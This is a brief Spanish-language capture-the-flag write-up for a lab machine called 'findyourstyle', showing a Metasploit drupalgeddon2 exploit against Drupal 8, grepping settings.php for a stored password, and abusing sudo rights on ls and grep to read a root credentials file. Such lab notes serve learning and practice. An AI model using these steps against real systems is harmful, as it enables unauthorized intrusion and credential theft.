# findyourstyle

version drupal 8 vulnerable

!\[\[Pasted image 20251014001802.png]]

```
msfconsole
```

```
search drupal 8
```

```
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

```
set LHOSTS y set RHOSTS
```

cuando nos da la consola interactiva lo hace desde el usuario www-data

hemos leido la configuracion del archivo de configuracion por defecto de drupal y filtramos por la palabra password que nos da la contraseña para el usuario ballenita

```
grep password /var/www/html/sites/default/settings.php
```

posteriormrente haciendo sudo -l vemos que tenemos permiso sudo con ls y con grep

hacemos sudo /bin/ls -la /root

y encontramos que existe un archivo con las credesnciales del usuairo root

como tenemos acceso a grep con sudo hacemos

```
grep '' /root/arhivo.txt
```

y nos muestra las credenciales del archivo y ya ganamos acceso a la maquina con rootdraa
